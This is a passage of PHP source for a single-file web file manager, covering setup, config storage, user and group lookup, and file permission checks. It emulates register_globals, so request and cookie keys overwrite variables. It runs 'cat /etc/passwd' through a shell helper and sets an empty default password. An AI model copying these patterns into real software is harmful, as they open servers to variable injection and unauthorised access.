			$_SERVER["PATH_INFO"] = $_SERVER["ORIG_PATH_INFO"];
		}
		function fix_directory_separator($str){
			global $is_windows;
			if ($is_windows) $str = str_replace('/',DIRECTORY_SEPARATOR,$str);
			else $str = str_replace('\\',DIRECTORY_SEPARATOR,$str);
			return $str;
		}
		if(!isset($_SERVER['DOCUMENT_ROOT'])) {
			if (isset($_SERVER['SCRIPT_FILENAME'])) $path = $_SERVER['SCRIPT_FILENAME'];
			elseif (isset($_SERVER['PATH_TRANSLATED'])) $path = str_replace('\\\\', '\\', $_SERVER['PATH_TRANSLATED']);
			$_SERVER['DOCUMENT_ROOT'] = substr($path, 0, 0-strlen($_SERVER['PHP_SELF']));
		}
		$_SERVER['DOCUMENT_ROOT'] = fix_directory_separator($_SERVER['DOCUMENT_ROOT']);
		if (@get_magic_quotes_gpc()) {
			function stripslashes_deep($value){
				return is_array($value)? array_map('stripslashes_deep', $value):$value;
			}
			$_POST = array_map('stripslashes_deep', $_POST);
			$_GET = array_map('stripslashes_deep', $_GET);
			$_COOKIE = array_map('stripslashes_deep', $_COOKIE);
		}
		// Register Globals (its an old script..)
		$blockKeys = array('_SERVER','_SESSION','_GET','_POST','_COOKIE');
		foreach ($_GET as $key => $val) if (array_search($key,$blockKeys) === false) $$key=$val;
		foreach ($_POST as $key => $val) if (array_search($key,$blockKeys) === false) $$key=$val;
		foreach ($_COOKIE as $key => $val) if (array_search($key,$blockKeys) === false && $key != 'fm_current_dir' && $key != 'ace_wrap') $$key=$val;
		// PHP_VERSION_ID is available as of PHP 5.2.7, if our version is lower than that, then emulate it
		if (!defined('PHP_VERSION_ID')) {
			$php_version = explode('.', PHP_VERSION);
			define('PHP_VERSION_ID', ($php_version[0] * 10000 + $php_version[1] * 100 + $php_version[2]));
			if (PHP_VERSION_ID < 50207) {
				define('PHP_MAJOR_VERSION',   $php_version[0]);
				define('PHP_MINOR_VERSION',   $php_version[1]);
				define('PHP_RELEASE_VERSION', $php_version[2]);
			}
		}
		// Server Vars
		function curl_server_online_check(){
			if (function_exists('curl_init')){
				@$ch = curl_init();
				curl_setopt($ch, CURLOPT_URL, "http://phpfm.sf.net");
				curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
				curl_setopt($ch, CURLOPT_HEADER, 0);
				@curl_exec($ch);
				$errnum = curl_errno($ch);
				@curl_close($ch);
			}
			return ($errnum == "0");
		}
		function socket_get_lan_ip($dest='64.0.0.0', $port=80) {
			$addr = '';
			if (function_exists('socket_create')){
				$socket = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);
				socket_connect($socket, $dest, $port);
				socket_getsockname($socket, $addr, $port);
				socket_close($socket);
			}
			return $addr;
		}
		function get_client_ip() {
			$ipaddress = '';
			if ($_SERVER['HTTP_CLIENT_IP']) $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
			else if($_SERVER['HTTP_X_FORWARDED_FOR']) $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
			else if($_SERVER['HTTP_X_FORWARDED']) $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
			else if($_SERVER['HTTP_FORWARDED_FOR']) $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
			else if($_SERVER['HTTP_FORWARDED']) $ipaddress = $_SERVER['HTTP_FORWARDED'];
			else if($_SERVER['HTTP_X_REAL_IP']) $ipaddress = $_SERVER['HTTP_X_REAL_IP'];
			else if($_SERVER['REMOTE_ADDR']) $ipaddress = $_SERVER['REMOTE_ADDR'];
			// proxy transparente não esconde o IP local, colocando ele após o IP da rede, separado por vírgula
			if (strpos($ipaddress, ',') !== false) {
				$ips = explode(',', $ipaddress);
				$ipaddress = trim($ips[0]);
			}
			if ($ipaddress == '::1' || $ipaddress == '127.0.0.1') $ipaddress = 'localhost';
			return $ipaddress;
		}
		$ip = @get_client_ip();
		$lan_ip = @socket_get_lan_ip();
		function getServerURL() {
			$url = (lowercase($_SERVER["HTTPS"]) == "on")?"https://":"http://";
			if (strlen($_SERVER["SERVER_NAME"])) $url .= $_SERVER["SERVER_NAME"];
			elseif (strlen($_SERVER["HTTP_HOST"])) $url .= $_SERVER["HTTP_HOST"];
			if ($_SERVER["SERVER_PORT"] != "80" && $_SERVER["SERVER_PORT"] != "443") $url .= ":".$_SERVER["SERVER_PORT"];
			return $url;
		}
		function getCompleteURL() {
			return getServerURL().$_SERVER["REQUEST_URI"];
		}
		$url = @getCompleteURL();
		$url_info = parse_url($url);
		$doc_root = rtrim($_SERVER["DOCUMENT_ROOT"],DIRECTORY_SEPARATOR); // ex: 'C:/htdocs'
		$url_root = rtrim(@getServerURL(),'/'); // ex. 'http://www.site.com'
		$fm_file = __FILE__;
		$fm_url = $url_root.$_SERVER["PHP_SELF"];
		$fm_path_info = pathinfo($fm_file);
		$open_basedir_ini = trim(@ini_get("open_basedir"));
		$open_basedirs = array();
		if (strlen($open_basedir_ini)) {
			$dirs = array($open_basedir_ini);
			if ($is_windows) {
				if (strpos($open_basedir_ini,';') !== false) {
					$dirs = explode(';',$open_basedir_ini);
				}
				$dirs = array_map('ucfirst',$dirs);
			} else {
				if (strpos($open_basedir_ini,':') !== false) {
					$dirs = explode(':',$open_basedir_ini);
				}
			}
			foreach ($dirs as $dir) {
				$dir = rtrim($dir,DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR; // fm_root must have trailing slash
				if (is_dir($dir)) $open_basedirs[] = $dir;
			}
		}
		$sys_lang = strtolower(substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2));
		if (!function_exists('mb_strtoupper')) {
			die('PHP File Manager<br>Error: Please enable "mbstring" php module.');
		}
		// +--------------------------------------------------
		// | Config Class
		// +--------------------------------------------------
		function object_to_array( $var ) {
			if( !is_object( $var ) && !is_array( $var ) ) {
				return $var;
			}
			if( is_object( $var ) ) {
				$var = get_object_vars( $var );
			}
			return array_map( 'object_to_array', $var );
		}
		function array_to_object( $var ) {
			if( !is_object( $var ) && !is_array( $var ) ) {
				return $var;
			}
			$obj = new stdClass();
			foreach ($var as $key => $value) {
				if (strlen($key)) $obj->{$key} = array_to_object( $value );
			}
			return $obj;
		}
		class config {
			var $data;
			function __construct(){
				$this->data = array(
					'lang'=>'',
					'fm_root'=>'',
					'timezone'=>'',
					'date_format'=>'Y/m/d H:i',
					'auth_pass'=>md5(''),
					'error_reporting'=>1
				);
			}
			function save(){
				global $fm_file;
				$config_string = "<?php".chr(13).chr(10)."//".json_encode($this->data).chr(13).chr(10);
				if (is_file($fm_file)){
					$lines = file($fm_file);
					$script_start_line = 1;
					if (strpos($lines[0],'<?php') === 0 && strpos($lines[1],'//{"') === 0) $script_start_line = 2;
					if ($fh = @fopen($fm_file, "w")){
						@fputs($fh,$config_string,strlen($config_string));
						for ($x=$script_start_line;$x<count($lines);$x++) @fputs($fh,$lines[$x],strlen($lines[$x]));
						@fclose($fh);
					}
				}
			}
			function load(){
				global $fm_file;
				$data = false;
				if (is_file($fm_file)){
					$fh = fopen($fm_file, 'r');
					$line1 = fgets($fh);
					$line2 = fgets($fh);
					$line3 = fgets($fh);
					fclose($fh);
					if (strpos($line1,'<?php') === 0 && strpos($line2,'//{"') === 0){
						$config_string = trim(substr($line2,2));
						if (strlen($config_string)) $data = object_to_array(json_decode($config_string));
					}
				}
				if (is_array($data) && count($data)) $this->data = $data;
				foreach ($this->data as $key => $val) $GLOBALS[$key] = $val;
			}
		}
		// +--------------------------------------------------
		// | Config Load
		// +--------------------------------------------------
		$cfg = new config();
		$cfg->load();
		if (strlen($timezone)) @date_default_timezone_set($timezone);
		//@setlocale(LC_CTYPE, 'C');
		//@ini_set('default_charset', $charset);
		@mb_internal_encoding($charset);
		@ini_set('mbstring.substitute_character','none'); // That will strip invalid characters from UTF-8 strings
		@ini_set("allow_url_fopen",1);
		@error_reporting(0);
		@ini_set("display_errors",0);
		if ($error_reporting > 0){
			error_reporting(E_ERROR | E_PARSE | E_COMPILE_ERROR); @ini_set("display_errors",1);
		}
		function fb_log(){
			global $error_reporting;
			if ($error_reporting < 2) return;
			if (!class_exists('ChromePhp')) return;
			$arguments = func_get_args();
			if (func_num_args() > 1 && is_string($arguments[0])) {
				ChromePhp::log($arguments[0].': ',$arguments[1]);
			} else {
				ChromePhp::log($arguments[0]);
			}
		}
		if (!strlen($fm_current_root)) {
			if ($is_windows) {
				if (strpos($doc_root,":") !== false) $fm_current_root = ucfirst(substr($doc_root,0,strpos($doc_root,":")+1).DIRECTORY_SEPARATOR); // If doc_root has ":" take the drive letter
				$fm_current_root = ucfirst($doc_root.DIRECTORY_SEPARATOR);
			} else {
				$fm_current_root = "/"; // Linux default show root
			}
		} else {
			if ($is_windows) $fm_current_root = ucfirst($fm_current_root);
		}
		if (strlen($fm_root)){
			$fm_current_root = $fm_root;
		}
		if (count($open_basedirs)){
			$fm_current_root_ok = false;
			foreach ($open_basedirs as $open_basedir) {
				if (strpos($fm_current_root,$open_basedir) !== false) {
					$fm_current_root_ok = true;
					break;
				}
			}
			if (!$fm_current_root_ok) {
				$fm_path = rtrim($fm_path_info["dirname"],DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR;
				foreach ($open_basedirs as $open_basedir) {
					if (strpos($fm_path,$open_basedir) !== false) {
						$fm_current_root = $open_basedir;
						$fm_current_root_ok = true;
						break;
					}
				}
			}
			if (!$fm_current_root_ok){
				$fm_current_root = $open_basedirs[0];
			}
		}
		if (!isset($fm_current_dir)){
			$fm_path = rtrim($fm_path_info["dirname"],DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR;
			if (strpos($fm_path,$fm_current_root) !== false) {
				$fm_current_dir = $fm_path;
			} else {
				$fm_current_dir = $fm_current_root;
			}
			if ($is_windows) $fm_current_dir = ucfirst($fm_current_dir);
			if (strlen($_COOKIE['fm_current_dir'])) {
				$fm_current_dir = $_COOKIE['fm_current_dir'];
			}
		}
		$fm_current_root = rtrim($fm_current_root,DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR;
		$fm_current_dir = rtrim($fm_current_dir,DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR;
		//fb_log('fm_root',$fm_root);
		//fb_log('fm_current_root',$fm_current_root);
		//fb_log('fm_current_dir',$fm_current_dir);
		if (isset($set_resolve_ids)){
			$resolve_ids=intval($set_resolve_ids);
			setcookie("resolve_ids", $resolve_ids, time()+$cookie_cache_time, "/");
		}
		// +--------------------------------------------------
		// | User/Group Functions
		// +--------------------------------------------------
		$passwd_array = false;
		function get_user_name($uid) {
			global $is_windows, $passwd_array;
			if ($is_windows) return $uid;
			if ($passwd_array === false){
				@system_exec_cmd("cat /etc/passwd",$passwd_file);
				$passwd_array = explode(chr(10),$passwd_file);
			}
			foreach ($passwd_array as $line) {
				$mat = explode(":",$line);
				if ($mat[2] == $uid){
					return $mat[0];
				}
			}
			if (function_exists('posix_getpwuid')) {
				$info = posix_getpwuid($uid);
				return $info['name'];
			}
			return $uid;
		}
		$group_array = false;
		function get_group_name($gid) {
			global $is_windows, $group_array;
			if ($is_windows) return $gid;
			if ($group_array === false){
				@system_exec_cmd("cat /etc/group",$group_file);
				$group_array = explode(chr(10),$group_file);
			}
			foreach ($group_array as $line) {
				$mat = explode(":",$line);
				if ($mat[2] == $gid){
					return $mat[0];
				}
			}
			if (function_exists('posix_getgrgid')) {
				$info = posix_getgrgid($gid);
				return $info['name'];
			}
			return $gid;
		}
		function get_user_groups($user_name) {
			global $is_windows, $group_array;
			if ($is_windows) return array();
			if ($group_array === false){
				@system_exec_cmd("cat /etc/group",$group_file);
				$group_array = explode(chr(10),$group_file);
			}
			$resul = array();
			$resul['ids'] = array();
			$resul['names'] = array();
			foreach ($group_array as $line) {
				$mat = explode(":",$line);
				$user_names = explode(",",$mat[3]);
				if (array_search($user_name,$user_names) !== false){
					$resul['ids'][] = $mat[2];
					$resul['names'][] = $mat[0];
				}
			}
			return $resul;
		}
		function is_rwx_phpfm($file,$what='r'){
			global $is_windows;
			// Note: You can only change the uid/euid of the current process when one of the two is currently set to 0 (root).
			// groupadd gteste
			// usermod -a -G gteste www-data
			// gpasswd -d www-data gteste
			if (!is_array($GLOBALS['script_info'])) {
				$GLOBALS['script_info'] = array();
				$GLOBALS['script_info']['sys_uname'] = function_exists('posix_uname') ? @posix_uname() : '';
				$GLOBALS['script_info']['sys_hostname'] = function_exists('gethostname') ? @gethostname() : '';
				if (!strlen($GLOBALS['script_info']['sys_hostname'])){
					$GLOBALS['script_info']['sys_hostname'] = @getenv('COMPUTERNAME');
				}
				$GLOBALS['script_info']['script_user_id'] = function_exists('posix_getuid') ? @posix_getuid() : '';
				$GLOBALS['script_info']['script_user_name'] = $GLOBALS['script_info']['script_user_id'];
				$GLOBALS['script_info']['script_user_home'] = '';
				$GLOBALS['script_info']['script_user_shell'] = '';
				$GLOBALS['script_info']['script_user_group_id'] = '';
				$GLOBALS['script_info']['script_user_group_name'] = '';
				$GLOBALS['script_info']['script_user_group_ids'] = array();
				$GLOBALS['script_info']['script_user_group_names'] = array();
				$GLOBALS['script_info']['script_group_id'] = function_exists('posix_getgid') ? @posix_getgid() : '';
				$GLOBALS['script_info']['script_group_name'] = $GLOBALS['script_info']['script_group_id'];
				$GLOBALS['script_info']['script_group_members'] = '';
				if ($GLOBALS['script_info']['script_user_id'] && function_exists('posix_getpwuid')) {
					$info = posix_getpwuid($GLOBALS['script_info']['script_user_id']);
					$GLOBALS['script_info']['script_user_home'] = $info['dir'];
					$GLOBALS['script_info']['script_user_shell'] = $info['shell'];
					$GLOBALS['script_info']['script_user_name'] = $info['name'];
					$GLOBALS['script_info']['script_user_group_id'] = $info['gid'];
					if (function_exists('posix_getgrgid')) {
						$info = posix_getgrgid($GLOBALS['script_info']['script_user_group_id']);
						$GLOBALS['script_info']['script_user_group_name'] = $info['name'];
					}
					$info = get_user_groups($GLOBALS['script_info']['script_user_name']);
					$GLOBALS['script_info']['script_user_group_ids'] = $info['ids'];
					$GLOBALS['script_info']['script_user_group_names'] = $info['names'];
					array_unshift($GLOBALS['script_info']['script_user_group_ids'], $GLOBALS['script_info']['script_user_group_id']);
					array_unshift($GLOBALS['script_info']['script_user_group_names'], $GLOBALS['script_info']['script_user_group_name']);
		
				}
				if (!strlen($GLOBALS['script_info']['script_user_name'])) {
					if (!system_exec_cmd('whoami',$GLOBALS['script_info']['script_user_name'])) {
						$GLOBALS['script_info']['script_user_name'] = '';
					}
				}
				if (!strlen($GLOBALS['script_info']['script_user_name']) && function_exists('get_current_user')) {
					$GLOBALS['script_info']['script_user_name'] = get_current_user();
				}
				if (!strlen($GLOBALS['script_info']['script_user_name'])){
					$GLOBALS['script_info']['script_user_name'] = @getenv('USERNAME') ? : @getenv('USER');
				}
				if ($is_windows && strpos($GLOBALS['script_info']['script_user_name'],'\\') !== false){
					$GLOBALS['script_info']['script_user_name'] = ucfirst(substr($GLOBALS['script_info']['script_user_name'],strpos($GLOBALS['script_info']['script_user_name'],'\\')+1));
				}
				if (function_exists('posix_getgrgid')) {
					$info = posix_getgrgid($GLOBALS['script_info']['script_group_id']);
					$GLOBALS['script_info']['script_group_name'] = $info['name'];
					$GLOBALS['script_info']['script_group_members'] = $info['members'];
				}
				fb_log($GLOBALS['script_info']);
			}
			$file_info = array();
			$file_info['name'] = $file;
			$file_stat = stat($file);
			$file_info['nlinks'] = $file_stat['nlink'];
			$file_info['perms'] = fileperms($file);
			$file_info['owner'] = fileowner($file);
			$file_info['group'] = filegroup($file);
			$file_info['is_owner_readable'] = ($file_info['perms'] & 0x0100);
			$file_info['is_group_readable'] = ($file_info['perms'] & 0x0020);
			$file_info['is_world_readable'] = ($file_info['perms'] & 0x0004);
			$file_info['is_readable'] = false;
			if ($file_info['is_world_readable']) {
				$file_info['is_readable'] = true;
			}
			if ($file_info['is_group_readable']) {
				foreach ($GLOBALS['script_info']['script_user_group_ids'] as $gid) {
					if ($file_info['group'] == $gid) {
						$file_info['is_readable'] = true;
						break;
					}
				}
			}
			if ($file_info['is_owner_readable'] && $file_info['owner'] == $GLOBALS['script_info']['script_user_id']) {
				$file_info['is_readable'] = true;
			}
			$file_info['is_owner_writable'] = ($file_info['perms'] & 0x0080);
			$file_info['is_group_writable'] = ($file_info['perms'] & 0x0010);
			$file_info['is_world_writable'] = ($file_info['perms'] & 0x0002);
			$file_info['is_writable'] = false;
			if ($file_info['is_world_writable']) {
				$file_info['is_writable'] = true;
			}
			if ($file_info['is_group_writable']) {
				foreach ($GLOBALS['script_info']['script_user_group_ids'] as $gid) {
					if ($file_info['group'] == $gid) {
						$file_info['is_writable'] = true;
						break;
					}
				}
			}
			if ($file_info['is_owner_writable'] && $file_info['owner'] == $GLOBALS['script_info']['script_user_id']) {
				$file_info['is_writable'] = true;
			}
			$file_info['is_owner_executable'] = ($file_info['perms'] & 0x0040);
			$file_info['is_group_executable'] = ($file_info['perms'] & 0x0400);
			$file_info['is_world_executable'] = ($file_info['perms'] & 0x0001);
			$file_info['is_executable'] = false;
			if ($file_info['is_world_executable']) {
				$file_info['is_executable'] = true;
			}
			if ($file_info['is_group_executable']) {
				foreach ($GLOBALS['script_info']['script_user_group_ids'] as $gid) {
					if ($file_info['group'] == $gid) {
						$file_info['is_executable'] = true;
						break;
					}
				}
			}
			if ($file_info['is_owner_executable'] && $file_info['owner'] == $GLOBALS['script_info']['script_user_id']) {
				$file_info['is_executable'] = true;
			}
			if ($what == 'r') return $file_info['is_readable'];
			if ($what == 'w') return $file_info['is_writable'];
			if ($what == 'x') return $file_info['is_executable'];
			return false;
		}
		function is_readable_phpfm($file){
			return is_rwx_phpfm($file,'r');
		}
		function is_writable_phpfm($file){
			return is_rwx_phpfm($file,'w');
		}
		function is_executable_phpfm($file){
			return is_rwx_phpfm($file,'x');
		}
		// +--------------------------------------------------
		// | BASE64 FILES
		// | So that PHP File Manager can remain a single file script,
		// | and still work normally on offline enviroments
		// +--------------------------------------------------
		if(!function_exists('apache_request_headers')){
			function apache_request_headers(){
				$arh = array();
				$rx_http = '/\AHTTP_/';
				foreach($SERVER as $key => $val) {
					if( preg_match($rx_http, $key) ) {
						$arh_key = preg_replace($rx_http, '', $key);
						$rx_matches = array();
						// do some nasty string manipulations to restore the original letter case
						// this should work in most cases
						$rx_matches = explode('', $arh_key);
						if( count($rx_matches) > 0 and strlen($arh_key) > 2 ) {
							foreach($rx_matches as $ak_key => $ak_val) {
								$rx_matches[$ak_key] = ucfirst($ak_val);
							}
							$arh_key = implode('-', $rx_matches);
						}
						$arh[$arh_key] = $val;
					}
				}
				return $arh;
			}
		}
		function get_base64_file(){
			global $filename,$fm_path_info;
			// +--------------------------------------------------
			$base64_files = array();
			$base64_files['32px.png'] = 'eJzNlvk31A8Xxz9mMQZZhuxlm0TJGlm/WcpeWZI1BiUJkTVLDKJBkV3IEA0RUykGMVJEhTC2MrbEGBNG9lke5/v88vwJz/uec89dzv3hnvM691yM7UXzQ9wS3AAAHLK0OGcPABxGBzGKC3zg3fLcJAAADNjaXD5/kLqWO0JQYjUAoKurC4FADir3r5vDAQDCDZqru3Xv3r2qqudVVVUEMTG3CkdOb/EXAFCNq9nd3e0EgZ5zcABuEtNl10Ee4lyHOMMjY0VSIVUAwB8i2Y5AbNfU4KDQg1nnZpVXAgJsJvs1HB4RGauahTx8n7P31KlOWdkTqcqODYZhPRekMzlroVDARejkE95qEGgxKeklF9dqTg5/LKwKBtvc2PQiGH/h5d3MyfFtsYR5iaQN3ArrdCn+Ee3xyiqTdDtzKHjlxo0RS8u3oqKLLi7LPj6NEMhDAFieLG2XlMQ76TB26EeOSFZWVs7W3mSz2SsrNAUFBRaDSS712fsz6+jkdrAUshjYWRxlbpHcfYK3NreYO7R1+vr09AxlaWmfTpn5/HCb1l1YVFie4ajVAIC08Qfd4eGRtaGmjZ+tf6e6KWNPe9/ENJXf6CdmT33FmQWaJiRi1tZWtes5txdGqghVe39mlqnUJ79v9M93zc7NhUXEnHoGaNQC+/Slqx9PqD4H4sYsmtYzBrYaXOtNGPv7QwCwBADUFdrQYrcunnNxcXFrfnAeAGgcHDVfKoyaoFoFkonjF96sPrjUIUIaITG3qQ0N81bv+beXJ14vPf5ELJXLh0SNmCwsLND/0qfI5BHSaB8Hx4eRHiw54fFosN9XdY+XZsefAqgeZfk0BGmYxC4snIBCt2b61gGA5evL3FnZT08/gTkS9MG6+ev7kvmg0Z2WldWVmB7X3Y1fDT+LHn0JjGx3DWl1io9vxn96Ozo6wW5snAIAZmTkjoLC+mjLmqEhVUDA7qPw9Y9nUoe8Hgx7Y0io6um0urWo2/06vQPN+G8vt2nkd8LC3gTTLXV18tcadm1tUn4qtqXS7pneV1J7+kBAxXhqSnvQ2Qqp2iLHvHmPElJMBeV2x/e3+o9Ov1/PU3+oRGjLL3hVppwraN9+lE0ms3t72bGxU/01+K53Xya6mkpclsLDwwsjSkpsox7HV7bVvliJwRMeVdc/CNge9T4gnhZmf9EBYKpIuRorcMBFmAksthtLS47FYrmb7+qKMil15222ypn7QWwmY2KiLhk1RRtvFKfUTpXsTSTtLW3skeQoJGrD0iB90Gl/dwjhnwNlsv8Vi/1/qd23vhmXAQC2YXnO+HLUJK3krvOwr1QPD3QyWkYxtJ9wQWGZr+HIn/bVeX63D35f7J7W27pYuRHt5KoVdcyMMQ+4n8o4DBIuhKSNlcA8iv+EtfzQjdSfipteLW60OXrP0sXkePc2+LTBQHHbzX9ic9pu76CtSG8zeO7sU563dpwFWcqgkVn/NexHiH/zQIIfsmMXLkUgECb4T6ihI+JWPV69eh9N8YmhbkZUHxFKHxW8te0FY1btWlj22qFAm1f4YbTym1f4G4dFMhd1k3t8yjsjGjKf+6Ru4o2eqT+8hIp4REdUq1Yqcfe+cVb24FH0o7/r1bzRX5KRALUXm7R/7/0l29MYraTUDXcHjpnbTmPCEdeQNtMYCPffBkxgYedrTbyJhI2z5/KbJ0M9gp7/tAemiI9vP8/ke2OB2uw7dtLD8y4HPt0dGQTCqcqbeoM2fxNZiF+VFmbsV4dWcpUCZEXlbFGzW5ZlY7n5+aMjAaqQrQ3WaJJbpu3lzdRiz5gFkmM5lpiR+/N03SVnFBZcCbqu1ok8idbYywzEu750kDhqxn2TXzG4p+3ScVntgR92402moSOfrKcLm9YtNruPW1t5sGbiDiurgXFqpmag97mGxPWia8dszdjOMxrXBO5npSD8VH7uivlScqbrQBC+neaI7yUFfWSP3KIi3SY4Q9dXPmQiFtDstjY0Ui0+fi+WQ2icBV72bC5dlQ4yBxWsmnHi8MoLaOhovsFVe3t93J3DYdzsf0Rrih10AycbCRdOK6t19cLD5Lphx9BwqU5rrB87enQ5eMUjRfi1cAnxNYPR19fHYDA01hReU6mUYdylUr1wU6FmQ/pi/x1fn/igpphYfD1aI1VOY2/sDV+qD8tf2OQkD3flHvLYMcP77dl9ihYyTJJmc3iXQnDMyxPHwZjQG7jmKQqFYi/kdwXqhM1g6aLHZVsKiCDT7NhkIuiIp6GDZ8eseVRMqUoP5iMh9CM0olPHNt8ozx1dW9DwdBX/AbyAkZWNGzS3+KwSjA0M0WHphMQK0XtAtJY1qciIoKDoi1bRLX8hEdQiruuzxjnqtgJfLmmtGQmWLLu4vPNyEEp/BcKpiTzgklnj7a4/47M3J4pOhfpKZx9V8JPvDlXURrNF28zmZk8bBsoJWIDgSDTkgPVdQWhNKTLLCGEhA0fCkVkQhAVIHzsrA4dYBsAGg9TEooOxtyGTPyyEyZce66pqqQ5UtkEUWgIC1RKApMC4zo0Hc9BPN7XBI38a+A2i6yZlGJwrNXf5cpQc0XBlNbmA5sSRYk648m8qOASNUlcc/ByZQAXHJ21l9XlpyKL9lJilaUy6djkPQpHcEQwS99HIcSfquvPDldfGYEETVwA4Y+5ZDq+Gort0oUTmuv1dngvrJoIr50DfKmCFMvqWiP0xpEYv77wmF3fssJO0s+ubI4id3gOUqRnderN7xJEdc7V1b5D+47Pf6XnJCaTA+cSRjt8/Xb66ItUIWKLfSU7IlvNKLT8jlHzRSMZT2tmpZwzGqstWVEOBaLlODOACXUOREK88uPDk/mGJhyBQAX0T/fZ69yPQDxKMdc0WqoS+W3dmkCNCx2Q9m7hFs2Xj3vGIyvj3X6VGf6e46vNIQiD+0crk3W/DDyb7bCywyznxVHDmc/GLbqCFK1xWf6SPDeYtaDoDCmvfHHelivBGXV6ecTM/Tc3cBhHjcdaQx0Y3rlzJH6bcUbdRjxKizKveToJOsuaoYH71jCyjpxUy5PutAIb5rDVYBKbtB05VDwSZotAu8fN7RL02Q4Os37DEmvM8QoPWwd3oq9nGGPBNBepUZPyMVIsR+h3GPUSmnj+5PiTlNG7jF2Y+3E/5I3HMKO9wEuNUgNaEErT/3JBInWeCUY56sMIHMea4mIWM3maRKp9XfIb1tRM3/ANP+QdqFTlaya/n4jgwiKMiYVteH1RiEcX2tF93Zcr1Tf7F6gAqrgPaso1A6P+SlgV5qmVAVG1EoofE7jgiPc55hJcTuV2TP2+1PJXySmuSCl9cwHZ4kiXTec08/tLO441fqsiZHPdWy9h/WXufVrMGSSG/uw5HBVvsopmnfOTlb/98s6g/jtVOrPgg3zh3cHDk23EaSZGdtDOhu63g+rLWlrYXc8SW/Px8rVvkH6HiUWkpDkKfeOnwyiONTTiEkA7qV6dbD5YxlUhdNAurLhuuhuU5XTZojZ9uX3UbdX8hIrBTXWjsgS2I0JGa5W5bm90jFHcnP/q4GdqF3jN9uNdHT5sYaMcHTbVbkyRk0ePYwfAsUbHFKiU9m7twqWBofZlkiOGBOwytr2jvSNOManKdUUmHyiUJVoBCuN5btQltd3zwPHvmhLDHfInk1h3O1bRcxTXZjk4dqIKAuEFZQ1kr0oroaXNXU1tnv3RfzjH7otdFlLtUtN1vZzx7t/neH0Q541BggPLtILKbnfp+aczq4zCh9W7DX5sVA5rOM80AJ5XaIPi5bHmyyVvii6R5pkrDCz28Z5+amdDoABunsm5V+vDvWXWDy0trpKTpNAxBQy/a1sdxg+RvCaZQlVlsFG4Q8uI0uCL5x0hSKp/J3EiSN2dXV2GCg+6AkBijrDHvrHQKr1mZ0MubbhZRhQKjDdJWnh2ae8L5+z2VOGWW/ux5MIxPUhvPJVgvx4hs1Cv9YwBx9Rvo+x808JLr/Lp3urk5g1YzDv4ewPL8xXP1JqjE/wCM9VEB';
			$base64_files['ace.js'] = '
